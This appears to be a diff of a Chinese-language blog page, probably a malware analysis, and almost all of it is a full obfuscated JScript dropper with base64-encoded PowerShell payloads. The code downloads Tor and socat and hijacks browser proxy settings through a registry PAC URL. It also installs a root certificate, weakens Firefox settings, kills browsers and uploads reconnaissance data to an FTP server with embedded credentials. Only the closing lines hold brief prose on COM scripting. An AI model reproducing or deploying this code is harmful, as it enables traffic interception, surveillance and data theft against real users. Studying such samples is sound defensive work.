+&quot;aWRkZW47CiAgICAgICAgfQogICAgfWZpbmFsbHl7CiAgICAgICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJDb250aW51ZSI7CiAgICB9CiAgICBpZiAoICQoVHJ5IHsgVGVzdC1QYXRoICRhRW50c0JNdHNheUIudHJpbSgpIH0gQ2F0Y2ggeyAkZmFsc2UgfSkp&quot;+
+&quot;ewogICAgICAgIHJldHVybiAkdHJ1ZTsKICAgIH0KICAgIHJldHVybiAkZmFsc2U7Cn0KZnVuY3Rpb24gSXdvUE1jewokc2NoZWR1bGVyVHlwZSA9IEluaXRTY2hlZHVsbGVyOwokdGY9JGVudjpUZW1wKydcJysoUmFuZG9tU3RyaW5nKSsnLnppcCc7CiREZXN0VFA9&quot;+
+&quot;JGVudjpBTExVU0VSU1BST0ZJTEUrJ1wnKyhSYW5kb21TdHJpbmcpOwokVG9yTWlycm9ycz1AKCJodHRwczovL2Rpc3QudG9ycHJvamVjdC5vcmcvIiwKImh0dHBzOi8vdG9ycHJvamVjdC5taXJyb3IubWV0YWxnYW1lci5ldS9kaXN0LyIsCiJodHRwczovL3Rvci55&quot;+
+&quot;YnRpLm5ldC9kaXN0LyIpOwpmb3JlYWNoICgkbWlycm9yIGluICRUb3JNaXJyb3JzKSB7CiAgICAkX3VybD0kbWlycm9yKyd0b3Jicm93c2VyLzcuMC4xMS90b3Itd2luMzItMC4zLjEuOS56aXAnOwogICAgaWYoKGlHZ1JMY3lJSlFCenJBICRfdXJsICR0Zikpewog&quot;+
+&quot;ICAgICAgIGJyZWFrOwogICAgfQp9CmlmICgoVGVzdC1QYXRoICREZXN0VFApIC1lcSAxKXtSZW1vdmUtSXRlbSAtRm9yY2UgLVJlY3Vyc2UgJERlc3RUUDt9bWtkaXIgJERlc3RUUCB8IE91dC1OdWxsOwpGVlJDbHNnZ01SQVogJHRmICREZXN0VFA7ClJlbW92ZS1J&quot;+
+&quot;dGVtIC1Gb3JjZSAkdGY7CiR5a0Y9JERlc3RUUCsnXFRvclwnOwokV3FQZnY9InZic2NyaXB0OmNsb3NlKENyZWF0ZU9iamVjdChgIldTY3JpcHQuU2hlbGxgIikuUnVuKGAidG9yLmV4ZWAiLDAsRmFsc2UpKSI7Cnhybk9scmogKFJhbmRvbVN0cmluZykgJ21zaHRh&quot;+
+&quot;LmV4ZScgJFdxUGZ2IDAgMCAkeWtGOwokU0ZpbGU9JGVudjpUZW1wKydcJysoUmFuZG9tU3RyaW5nKSsnLnppcCc7CndoaWxlICghKGlHZ1JMY3lJSlFCenJBICdodHRwczovL2dpdGh1Yi5jb20vU3R1ZGlvRXRyYW5nZS9zb2NhdC13aW5kb3dzL2FyY2hpdmUvMS43&quot;+
+&quot;LjIuMS56aXAnICRTRmlsZSkpe30KRlZSQ2xzZ2dNUkFaICRTRmlsZSAkRGVzdFRQOwokc19vbGQ9JERlc3RUUCsnXHNvY2F0LXdpbmRvd3MtMS43LjIuMVwnOwokc19uZXc9KFJhbmRvbVN0cmluZyk7ClJlbW92ZS1JdGVtIC1Gb3JjZSAkU0ZpbGU7ClJlbmFtZS1J&quot;+
+&quot;dGVtIC1wYXRoICRzX29sZCAtbmV3TmFtZSAkc19uZXc7CiRkTGtkT2R2cz0kRGVzdFRQKydcJyskc19uZXcrJ1wnOwokczFjbWQ9J3NvY2F0IHRjcDQtTElTVEVOOjU1NTUscmV1c2VhZGRyLGZvcmssa2VlcGFsaXZlLGJpbmQ9MTI3LjAuMC4xIFNPQ0tTNEE6MTI3&quot;+
+&quot;LjAuMC4xOiVET01BSU4lOjgwLHNvY2tzcG9ydD05MDUwJzsKJHMyY21kPSdzb2NhdCB0Y3A0LUxJU1RFTjo1NTg4LHJldXNlYWRkcixmb3JrLGtlZXBhbGl2ZSxiaW5kPTEyNy4wLjAuMSBTT0NLUzRBOjEyNy4wLjAuMTolRE9NQUlOJTo1NTg4LHNvY2tzcG9ydD05&quot;+
+&quot;MDUwJzsKJFN5QVN4Vj0idmJzY3JpcHQ6Y2xvc2UoQ3JlYXRlT2JqZWN0KGAiV1NjcmlwdC5TaGVsbGAiKS5SdW4oYCIkczFjbWRgIiwwLEZhbHNlKSkiOwokQ2tlSGFFTW9RYj0idmJzY3JpcHQ6Y2xvc2UoQ3JlYXRlT2JqZWN0KGAiV1NjcmlwdC5TaGVsbGAiKS5S&quot;+
+&quot;dW4oYCIkczJjbWRgIiwwLEZhbHNlKSkiOwp4cm5PbHJqIChSYW5kb21TdHJpbmcpICdtc2h0YS5leGUnICRTeUFTeFYgMCAwICRkTGtkT2R2czsKeHJuT2xyaiAoUmFuZG9tU3RyaW5nKSAnbXNodGEuZXhlJyAkQ2tlSGFFTW9RYiAwIDAgJGRMa2RPZHZzOwokd1hk&quot;+
+&quot;UmJDRnduPSJ2YnNjIisicmlwdDpjbG9zZShDcmVhdGVPYmplY3QoYCJXU2NyaXB0LlNoZWxsYCIpLlJ1bihgInBvd2Vyc2hlbGwuZXhlIGAiYCJgJEY9YCRlbnY6VGVtcCsnXFwiKyhSYW5kb21TdHJpbmcpKyIuZXhlJztybSAtRm9yY2UgYCRGO2AkY2w9KE5ldy1P&quot;+
+&quot;YmplY3QgTmV0LldlYkNsaWVudCk7YCRjbC5Eb3dubG9hZEZpbGUoJ2h0dHA6Ly8xMjcuMC4wLjE6NTU1NS8iKyhSYW5kb21TdHJpbmcpKyIuYXNwP3RzJmlwPScrYCRjbC5Eb3dubG9hZGAiK2AiU3RyaW5nKCdodHRwOi8vYXBpLmlwaWZ5Lm9yZy8nKSxgJEYpOyYg&quot;+
+&quot;YCRGYCJgImAiLDAsRmFsc2UpKSI7Cnhybk9scmogKFJhbmRvbVN0cmluZykgJ21zaHRhLmV4ZScgJHdYZFJiQ0Z3biAxOwp9Ckl3b1BNYzs=&quot;,
+    EMAoYeN: &quot;JExvZ2ZpbGUgPSAkZW52OlRlbXArIlxcJChnYyBlbnY6Y29tcHV0ZXJuYW1lKS5sb2ciOwoKRnVuY3Rpb24gTG9nV3JpdGUKewogIFBhcmFtIChbc3RyaW5nXSRsb2dzdHJpbmcpCiAgJGR0PUdldC1EYXRlIC1Gb3JtYXQgImRkLk1NLnl5eXkgSEg6bW06c3MiOwog&quot;+
+&quot;ICRtc2c9W3N0cmluZ106OkZvcm1hdCgiW3swfV06Olt7MX1dIiwkZHQsJGxvZ3N0cmluZyk7CiAgV3JpdGUtSG9zdCAkbXNnOwogIEFkZC1jb250ZW50ICRMb2dmaWxlIC12YWx1ZSAkbXNnOwp9CkZ1bmN0aW9uIFVwbG9hZExvZwp7CiAgJGRlc3QgPSAiZnRwOi8v&quot;+
+&quot;cmRrdW5kOnJhaW5kYW5jZUBmdHAxLndtLm5ldC91cGQiOwogICR3ZWJjbGllbnQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTmV0LldlYkNsaWVudDsKICAkd2ViY2xpZW50LlVwbG9hZEZpbGUoIiRkZXN0LyQoZ2MgZW52OmNvbXB1dGVybmFtZSkubG9n&quot;+
+&quot;IiwgJExvZ2ZpbGUpOwogIFJlbW92ZS1JdGVtIC1QYXRoICRMb2dmaWxlOwp9CmZ1bmN0aW9uIENoZWNrSW5zdGFsbCgpewogICR3aW5pbmZvID0gKEdldC1XbWlPYmplY3QgV2luMzJfT3BlcmF0aW5nU3lzdGVtIHwgU2VsZWN0IENhcHRpb24sIFNlcnZpY2VQYWNr&quot;+
+&quot;TWFqb3JWZXJzaW9uLCBPU0FyY2hpdGVjdHVyZSwgVmVyc2lvbiwgTVVJTGFuZ3VhZ2VzKTsKICAkd2luaW5mby5NVUlMYW5ndWFnZXM9JHdpbmluZm8uTVVJTGFuZ3VhZ2VzIC1qb2luICIsIjsKICBMb2dXcml0ZSgiT1MgaW5mbzogezB9IiAtZiAkd2luaW5mbyAt&quot;+
+&quot;am9pbiAiIik7CiAgaWYgKHRlc3QtcGF0aCB2YXJpYWJsZTpwc3ZlcnNpb250YWJsZSkgewogICAgJHZlcnNpb24gPSAkcHN2ZXJzaW9udGFibGUucHN2ZXJzaW9uOwogIH0gZWxzZSB7CiAgICAkdmVyc2lvbiA9IFt2ZXJzaW9uXSIxLjAuMC4wIjsKICB9CiAgTG9n&quot;+
+&quot;V3JpdGUoIlBvd2Vyc2hlbGwgdmVyc2lvbjogezB9IiAtZiAkdmVyc2lvbik7CiAgdHJ5IHsKICAgICRwYWM9R2V0LUl0ZW1Qcm9wZXJ0eSAnaGtjdTpcU29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXEludGVybmV0IFNldHRpbmdz&quot;+
+&quot;XCd8U2VsZWN0IC1leHBhbmQgQXV0b0NvbmZpZ1VSTCAtRXJyb3JBY3Rpb24gU3RvcDsKICAgIExvZ1dyaXRlKCJQYWMgc2V0dGVkOiAnJHBhYyciKTsKICB9CiAgY2F0Y2ggewogICAgTG9nV3JpdGUoIkVSUk9SOiBQYWMgbm90IHNldHRlZCIpOwogIH0KICAkQ2Vy&quot;+
+&quot;dHMgPSBAKEdldC1DaGlsZEl0ZW0gY2VydDpcQ3VycmVudFVzZXJcUk9PVHxXaGVyZS1PYmplY3QgeyRfLlN1YmplY3QgLWxpa2UgIipDT01PRE8gUlNBIEV4dGVuZGVkIFZhbGlkYXRpb24gU2VjdXJlIFNlcnZlciBDQSAyKiIgLW9yICRfLlN1YmplY3QgLWxpa2Ug&quot;+
+&quot;IipDT01PRE8gQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkqIn18Rm9yRWFjaC1PYmplY3QgeyJ7MH0gKHsxfSkiIC1mICgkXy5UaHVtYnByaW50LCRfLk5vdEJlZm9yZSl9KTsKICBpZiAoLU5PVCAkQ2VydHMuY291bnQgLWVxIDApewogICAgTG9nV3JpdGUoIkNlcnRz&quot;+
+&quot;IGluc3RhbGxlZDogJ3swfSciIC1mICgkQ2VydHMgLWpvaW4gIjsgIikpOwogIH1lbHNlIHsKICAgIExvZ1dyaXRlKCJDZXJ0cyBub3QgZm91bmQiKTsKICB9CiAgdHJ5ewogICAgJHByb2MgPSBHZXQtUHJvY2VzcyB8IFdoZXJlLU9iamVjdCB7JF8uUHJvY2Vzc05h&quot;+
+&quot;bWUgLWxpa2UgInRvcioiIC1vciAkXy5Qcm9jZXNzTmFtZSAtbGlrZSAic29jYXQqIn18U2VsZWN0IC1Qcm9wZXJ0eSBAeyBOYW1lPSJPdXQiOyBFeHByZXNzaW9uPXsiSUQ6ezB9YG5OYW1lOnsxfWBuUGF0aDp7Mn1gbi0tLS0tLS0tLS0tLS0iIC1mICRfLklkLCRf&quot;+
+&quot;LlByb2Nlc3NOYW1lLCRfLlBhdGh9fXxTZWxlY3QgLWV4cGFuZCBPdXQ7CiAgICBMb2dXcml0ZSgiUHJvY2Nlc3MgbGlzdDpgbnswfSIgLWYgKCRwcm9jIC1qb2luICJgbiIpKTsKICB9CiAgY2F0Y2ggewogICAgTG9nV3JpdGUoIkVSUk9SOiBDYW4ndCBnZXQgcHJv&quot;+
+&quot;Y2Nlc3MgbGlzdCIpOwogIH0KICAkRGVzdFRQPSRlbnY6QUxMVVNFUlNQUk9GSUxFOwogIHRyeXsKICAgICRkaXJzPWRpcigkRGVzdFRQKSAtRXJyb3JBY3Rpb24gU3RvcDsKICAgIExvZ1dyaXRlKCJMaXN0IGRpciBbezB9XTogezF9IiAtZiAoJERlc3RUUCwgKCgk&quot;+
+&quot;ZGlyc3xTZWxlY3QgLWV4cGFuZCBOYW1lKSAtam9pbiAiOyAiKSkpOwogICAgZm9yZWFjaCgkZGlyIGluICRkaXJzKXsKICAgICAgICB0cnl7CiAgICAgICAgICAgICRzdWJkaXI9ZGlyKCRkaXIuRnVsbE5hbWUpIC1FcnJvckFjdGlvbiBTdG9wOwogICAgICAgICAg&quot;+
+&quot;ICBMb2dXcml0ZSgiTGlzdCBkaXIgW3swfV06ezF9IiAtZiAoJGRpci5GdWxsTmFtZSwgKCgkc3ViZGlyfFNlbGVjdCAtZXhwYW5kIE5hbWUpIC1qb2luICI7ICIpKSk7CiAgICAgICAgfQogICAgICAgIGNhdGNoewogICAgICAgICAgICBMb2dXcml0ZSgiRVJST1I6&quot;+
+&quot;IENhbid0IGxpc3QgZGlyIHswfSIgLWYgJGRpci5GdWxsTmFtZSk7CiAgICAgICAgfQogICAgfQogIH0KICBjYXRjaCB7CiAgICBMb2dXcml0ZSgiRVJST1I6IENhbid0IGxpc3QgZGlyIHswfSIgLWYgJERlc3RUUCk7CiAgfQoKICAkYXZsaXN0PShHZXQtV21pT2Jq&quot;+
+&quot;ZWN0IC1OYW1lc3BhY2UgInJvb3RcU2VjdXJpdHlDZW50ZXIyIiAtUXVlcnkgIlNFTEVDVCAqIEZST00gQW50aVZpcnVzUHJvZHVjdCIgIEBwc2JvdW5kcGFyYW1ldGVyc3xTZWxlY3QgLWV4cGFuZCBEaXNwbGF5TmFtZSk7CiAgaWYgKC1OT1QgJGF2bGlzdC5jb3Vu&quot;+
+&quot;dCAtZXEgMCl7CiAgICBMb2dXcml0ZSgiQXYgaW5zdGFsbGVkOiAnezB9JyIgLWYgKCRhdmxpc3QgLWpvaW4gIjsgIikpOwogIH1lbHNlIHsKICAgIExvZ1dyaXRlKCJBdiBub3QgZm91bmQiKTsKICB9Cn0KZnVuY3Rpb24gU3RhcnRXb3JrKCl7CiAgTG9nV3JpdGUg&quot;+
+&quot;IlN0YXJ0IExvZyBtb2R1bGUiOwogIENoZWNrSW5zdGFsbDsKICBVcGxvYWRMb2c7Cn0KU3RhcnRXb3JrOwo=&quot;
+};
+var LbXYsoZotGh={_keyStr:&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;,encode:function(e){var t=&quot;&quot;;var n,r,i,s,o,u,a;var f=0;e=LbXYsoZotGh._utf8_encode(e);while(f&lt;e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n&gt;&gt;2;o=(n&amp;3)&lt;&lt;4|r&gt;&gt;4;u=(r&amp;15)&lt;&lt;2|i&gt;&gt;6;a=i&amp;63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},nzJryrgLluyiPwC:function(e){var t=&quot;&quot;;var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,&quot;&quot;);while(f&lt;e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s&lt;&lt;2|o&gt;&gt;4;r=(o&amp;15)&lt;&lt;4|u&gt;&gt;2;i=(u&amp;3)&lt;&lt;6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=LbXYsoZotGh._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,&quot;n&quot;);var t=&quot;&quot;;for(var n=0;n&lt;e.length;n++){var r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r)}else if(r&gt;127&amp;&amp;r&lt;2048){t+=String.fromCharCode(r&gt;&gt;6|192);t+=String.fromCharCode(r&amp;63|128)}else{t+=String.fromCharCode(r&gt;&gt;12|224);t+=String.fromCharCode(r&gt;&gt;6&amp;63|128);t+=String.fromCharCode(r&amp;63|128)}}return t},_utf8_decode:function(e){var t=&quot;&quot;;var n=0;var r=c1=c2=0;while(n&lt;e.length){r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r);n++}else if(r&gt;191&amp;&amp;r&lt;224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&amp;31)&lt;&lt;6|c2&amp;63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&amp;15)&lt;&lt;12|(c2&amp;63)&lt;&lt;6|c3&amp;63);n+=3}}return t}};
+var SGUUmXppVIOh={
+    Jer:function(KIp,uIDujligs){
+        var OZK = new ActiveXObject(&quot;ADODB.Stream&quot;);
+        OZK.Open();
+        OZK.Type=BINARY_STREAM_TYPE;
+
+        var LysWjSbnQFw = new ActiveXObject(&quot;ADODB.Recordset&quot;);
+        var yrHlCecaTbDwO=uIDujligs.length*2;
+        LysWjSbnQFw.Fields.Append(&quot;data&quot;,204,yrHlCecaTbDwO,0x80);
+        LysWjSbnQFw.Open();
+        LysWjSbnQFw.AddNew();
+        LysWjSbnQFw.Fields(&quot;data&quot;).AppendChunk(uIDujligs);
+        LysWjSbnQFw.Update();
+        LysWjSbnQFw.MoveFirst();
+        var binArray = LysWjSbnQFw(&quot;data&quot;).GetChunk(yrHlCecaTbDwO);
+        LysWjSbnQFw.Close();
+
+        eval(&quot;OZK.Wri&quot; + &quot;te(bin&quot;+&quot;Array)&quot;);
+        OZK.Position=0;
+
+        if(VTU.FileExists(KIp)){
+            VTU.DeleteFile(KIp);
+        }
+        OZK.SaveToFile(KIp);
+        OZK.Close();
+
+        var outStreamA = new ActiveXObject(&quot;ADODB.Stream&quot;);
+        var outStreamB = new ActiveXObject(&quot;ADODB.Stream&quot;);
+        outStreamA.Type=TEXT_STREAM_TYPE;
+        outStreamB.Type=TEXT_STREAM_TYPE;
+        outStreamB.Charset = &quot;ISO-8859-1&quot;;
+        outStreamA.Open();
+        outStreamB.Open();
+        outStreamA.LoadFromFile(KIp);
+        outStreamA.Position = 0; 
+        outStreamA.CopyTo(outStreamB);
+        outStreamA.Close();
+        outStreamB.SaveToFile(KIp,CREATE_OVERWRITE_SAVE_MODE);
+        outStreamB.Close();
+    },
+    QVn: function(m, n){
+        m = parseInt(m,10);
+        n = parseInt(n,10);
+        return Math.floor(Math.random() * (n - m + 1)) + m;
+    },
+
+    PsdPmHMCVqenzuN: function(RWTYk, eOUGCiHno){
+    //生成随机文件名，用于命名解密后的ps脚本
+        var xgVtJMwJgIjIpu = 0;
+        var weFKCALZLcXDGMD = &quot;&quot;;
+        var KeAR;
+        if (eOUGCiHno === undefined) {
+            eOUGCiHno = false;
+        }
+        while (xgVtJMwJgIjIpu &lt; RWTYk) {
+            KeAR = (Math.floor((Math.random() * 100)) % 94) + 33;
+            if (!eOUGCiHno) {
+                if ((KeAR &gt;= 33) &amp;&amp; (KeAR &lt;= 47)) {
+                    continue;
+                }
+                if ((KeAR &gt;= 58) &amp;&amp; (KeAR &lt;= 64)) {
+                    continue;
+                }
+                if ((KeAR &gt;= 91) &amp;&amp; (KeAR &lt;= 96)) {
+                    continue;
+                }
+                if ((KeAR &gt;= 123) &amp;&amp; (KeAR &lt;= 126)) {
+                    continue;
+                }
+            }
+            xgVtJMwJgIjIpu++;
+            weFKCALZLcXDGMD += String.fromCharCode(KeAR);
+        }
+        return weFKCALZLcXDGMD;
+    },
+    nahF: function(str){
+        return str.replace(/(^\s+)|(\s+$)/g, &quot;&quot;);
+    }
+};
+if (!String.format) {
+  String.format = function(format) {
+    var args = Array.prototype.slice.call(arguments, 1);
+    return format.replace(/{(\d+)}/g, function(match, number) { 
+      return typeof args[number] != &quot;undefined&quot;
+        ? args[number] 
+        : match
+      ;
+    });
+  };
+}
+function pjWBhLWlAGVeKiN(){
+    //ps脚本路径
+    this.kZNsJyERrbjMEdZ=SGUUmXppVIOh.PsdPmHMCVqenzuN(8)+&quot;.ps1&quot;;
+
+    this.lNTsAY=function(){
+        var iAoIOlPGFpaBof = new ActiveXObject(&quot;MSXML2&quot;+&quot;.XML&quot;+&quot;HTTP&quot;);
+        try{
+            iAoIOlPGFpaBof.open(&quot;GET&quot;,&quot;http://api.ipify.org/&quot;,false);
+            iAoIOlPGFpaBof.send();
+            if(iAoIOlPGFpaBof.status==200){
+                return SGUUmXppVIOh.nahF(iAoIOlPGFpaBof.responseText);
+            }
+        }catch(e){}
+        try{
+            iAoIOlPGFpaBof.open(&quot;GET&quot;,&quot;http://icanhazip.com/&quot;,false);
+            iAoIOlPGFpaBof.send();
+            if(iAoIOlPGFpaBof.status==200){
+                return SGUUmXppVIOh.nahF(iAoIOlPGFpaBof.responseText);
+            }
+        }catch(e){}
+        return &quot;&quot;;
+    };
+
+    this.qtPLqwQxQHKKe=function(){
+        sZTSiOfmguW.RegWrite(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;SEtDV&quot;+&quot;VxTb2Z0d2FyZVxNaWNyb3NvZ&quot;+&quot;nRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm&quot;+&quot;5ldCBTZXR0aW5nc1xBdXRvRGV0ZWN0&quot;),0,&quot;REG_DWORD&quot;);
+
+        for(var i=0;i&lt;5;i++){
+            var nNxFkACp=this.lNTsAY();
+            if(nNxFkACp.length&gt;0){
+                this.EdFcz(String.format(&quot;http://127.0.0.1:5555/{0}.js?ip={1}&quot;,SGUUmXppVIOh.PsdPmHMCVqenzuN(8),nNxFkACp));
+            }
+        }
+    };
+    this.EdFcz=function(s){
+        sZTSiOfmguW.RegWrite(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;SEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5nc1xBdXRvQ29uZmlnVVJM&quot;),s,&quot;REG_SZ&quot;);
+    };
+    this.CXaBSojpHZJEm=function(){
+        this.kZNsJyERrbjMEdZ=iOU+&quot;\\&quot;+this.kZNsJyERrbjMEdZ;
+        var uIDujligs=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.moZgTncSGjjMW);
+        uIDujligs=uIDujligs.replace(&quot;%CERT%&quot;,kVQNRMoBaO.oUXMMFdTE);
+        SGUUmXppVIOh.Jer(this.kZNsJyERrbjMEdZ,uIDujligs);
+        sZTSiOfmguW.Run(&quot;cmd /c powershell -ep Unrestricted -f \&quot;&quot;+this.kZNsJyERrbjMEdZ+&quot;\&quot; | find /v \&quot;\&quot; &gt;&gt; \&quot;&quot;+dEhkFnrZt+&quot;\&quot;&quot;,0,true);
+    };
+    this.BUUZMOIyOFXApCU=function(){
+        if(VTU.FileExists(this.kZNsJyERrbjMEdZ)){
+            VTU.DeleteFile(this.kZNsJyERrbjMEdZ);
+        }
+    };
+}
+function QPxG(){
+    //修改火狐配置文件
+    var SFrPOCQQqgWuzbr = DSoEmfpCHxm + &quot;\\Mozilla\\Firefox\\Profiles&quot;;
+    this.VqJKSQXiygGQzw=SGUUmXppVIOh.PsdPmHMCVqenzuN(8)+&quot;.ps1&quot;;
+
+    this.FPdjKpheWo=function(){
+        if(VTU.FolderExists(SFrPOCQQqgWuzbr)){
+            var ArrFirefoxProfileList=VTU.GetFolder(SFrPOCQQqgWuzbr).SubFolders;
+            if(ArrFirefoxProfileList.Count&gt;0){
+                var e = new Enumerator(ArrFirefoxProfileList);
+                e.moveFirst();
+                while (e.atEnd() == false){
+                    var folder=e.item();
+                    if(folder.Name.indexOf(&quot;.default&quot;)&gt;-1){
+                        return folder.Path;
+                    }
+                    e.moveNext();
+                }
+            }
+        }
+        return false;
+    };
+    this.InstallPac=function(){
+        var StrProfile=this.FPdjKpheWo();
+        if(StrProfile!=false){
+            var StrPrefsJs=StrProfile+LbXYsoZotGh.nzJryrgLluyiPwC(&quot;XHByZWZzLmpz&quot;);
+            if(VTU.FileExists(StrPrefsJs)){
+                var StrContent=VTU.OpenTextFile(StrPrefsJs,1).ReadAll();
+                var ArrContent=StrContent.split(&quot;\n&quot;);
+                var NewArrContent=[];
+                for(var i=0;i&lt;ArrContent.length;i++){
+                    if(ArrContent[i].indexOf(&quot;network.dns.blockDotOnion&quot;)!=-1){
+                        ArrContent[i]=ArrContent[i].replace(&quot;true&quot;,&quot;false&quot;);
+                    }
+                    if(ArrContent[i].indexOf(&quot;network.proxy.&quot;)==-1 &amp;&amp; ArrContent[i].indexOf(&quot;security.enterprise_roots.enabled&quot;)==-1){
+                        NewArrContent.push(ArrContent[i]);
+                    }
+
+                }
+                NewArrContent.push(&quot;user_pref(\&quot;network.dns.blockDotOnion\&quot;, false);&quot;);
+                NewArrContent.push(&quot;user_pref(\&quot;security.enterprise_roots.enabled\&quot;, true);&quot;);
+                StrContent=NewArrContent.join(&quot;\n&quot;);
+                var stream=VTU.CreateTextFile(StrPrefsJs, true);
+                stream.Write(StrContent);
+                stream.Close();
+            }
+        }
+    };
+    this.InstallCert=function(){
+        this.VqJKSQXiygGQzw=iOU+&quot;\\&quot;+this.VqJKSQXiygGQzw;
+        var uIDujligs=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.dDrnVhWm);
+        uIDujligs=uIDujligs.replace(&quot;%CERT%&quot;,kVQNRMoBaO.oUXMMFdTE);
+        SGUUmXppVIOh.Jer(this.VqJKSQXiygGQzw,uIDujligs);
+        sZTSiOfmguW.Run(&quot;cmd /c powershell -ep Unrestricted -f \&quot;&quot;+this.VqJKSQXiygGQzw+&quot;\&quot; | find /v \&quot;\&quot; &gt;&gt; \&quot;&quot;+dEhkFnrZt+&quot;\&quot;&quot;,0,true);
+    };
+    this.Close=function(){
+        if(VTU.FileExists(this.VqJKSQXiygGQzw)){
+            VTU.DeleteFile(this.VqJKSQXiygGQzw);
+        }
+    };
+}
+function C_TP(){
+    this.FileName=SGUUmXppVIOh.PsdPmHMCVqenzuN(SGUUmXppVIOh.QVn(5,10))+&quot;.ps1&quot;;
+    this.Install=function(){
+        var indexDomain=SGUUmXppVIOh.QVn(0,kVQNRMoBaO.LgiwpoajBw.length-1);
+        var Domain=kVQNRMoBaO.LgiwpoajBw[indexDomain];
+        this.FileName=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%ALLUSERSPROFILE%&quot;)+&quot;\\&quot;+this.FileName;
+        var uIDujligs=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.Ghq);
+        uIDujligs=uIDujligs.replace(/%DOMAIN%/g,Domain);
+        SGUUmXppVIOh.Jer(this.FileName,uIDujligs);
+        sZTSiOfmguW.Run(&quot;cmd /c powershell -ep Unrestricted -f \&quot;&quot;+this.FileName+&quot;\&quot; | find /v \&quot;\&quot; &gt;&gt; \&quot;&quot;+dEhkFnrZt+&quot;\&quot;&quot;,0,true);
+    };
+    this.Close=function(){
+        if(VTU.FileExists(this.FileName)){
+            VTU.DeleteFile(this.FileName);
+        }
+    };
+}
+function Kvkvfz(){
+    this.FileName=iOU+&quot;\\&quot;+SGUUmXppVIOh.PsdPmHMCVqenzuN(8)+&quot;.ps1&quot;;
+    this.lfjxeqjOrhPGUA=function(){
+        //查询ip
+        CotZ=new pjWBhLWlAGVeKiN();
+        PBPRfNXyqx=new QPxG();
+        XVEbnkh=new C_TP();
+    };
+    //主函数
+    this.dKrfMFdadkN=function(){
+
+        if(this.CheckTest()){
+
+            return false;
+
+        }
+        this.lfjxeqjOrhPGUA();
+        XVEbnkh.Install();
+        this.MXcIDEpEes();
+        this.vhQUbnorFnIqy();
+        this.fDBh();
+        this.Close();
+
+        this.sqtf();
+
+    };
+    this.vhQUbnorFnIqy=function(){
+        CotZ.CXaBSojpHZJEm();
+        CotZ.qtPLqwQxQHKKe();
+    };
+    this.fDBh=function(){
+        PBPRfNXyqx.InstallCert();
+        PBPRfNXyqx.InstallPac();
+    };
+    //写注册表
+    this.MXcIDEpEes=function(){
+        sZTSiOfmguW.Run(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;dGFza2tpbGwgL0Y&quot;+&quot;gL2ltIGlleHBsb3JlLmV4ZQ==&quot;),0,false);
+        sZTSiOfmguW.Run(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;dGFza2tpbGwgL0Yg&quot;+&quot;L2ltIGZpcmVmb3guZXhl&quot;),0,false);
+        sZTSiOfmguW.Run(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;dGFza2tpbGwgL0YgL&quot;+&quot;2ltIGNocm9tZS5leGU=&quot;),0,false);
+    };
+    this.sqtf=function(){
+        var bData=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.EMAoYeN);
+        SGUUmXppVIOh.Jer(this.FileName,bData);
+        sZTSiOfmguW.Run(&quot;powershell -ep Unrestricted -f \&quot;&quot;+this.FileName+&quot;\&quot;&quot;,0,true);
+        if(VTU.FileExists(this.FileName)){
+            VTU.DeleteFile(this.FileName);
+        }
+    };
+    //检测操作系统语言版本
+    this.CheckTest=function(){
+        var langs = GetObject(&quot;winmgmts:\\\\.\\root\\cimv2&quot;).ExecQuery(&quot;Select * from Win32_OperatingSystem&quot;);
+        var arr = [];
+        for (var enumItems = new Enumerator(langs) ; !enumItems.atEnd() ; enumItems.moveNext()) {
+            var MUILanguages = enumItems.item().MUILanguages.toArray();
+            for (i in MUILanguages) {
+                arr.push(MUILanguages[i]);
+            }
+        }
+        var muilangs = arr.join(&quot;,&quot;);
+        if(muilangs==&#39;en-US&#39;){
+            return true;
+        }
+        return false;
+    }
+    this.Close=function(){
+        CotZ.BUUZMOIyOFXApCU();
+        PBPRfNXyqx.Close();
+        XVEbnkh.Close();
+    };   
+}
+var eGHfyRDGqtYby = new Kvkvfz();
+eGHfyRDGqtYby.dKrfMFdadkN();</code></pre>
+<h2 id="com调用jscript代码"><a href="#com调用jscript代码" class="headerlink" title="com调用jscript代码"></a>com调用jscript代码</h2><pre><code>      1.  CoCreateInstance()创建javascript的引擎，获得jscript引擎的接口的IActiveScript 
+      2.  实现回调调用接口IActiveScriptSite，通过IActiveScript-&gt;SetScriptSite()交给脚本回调
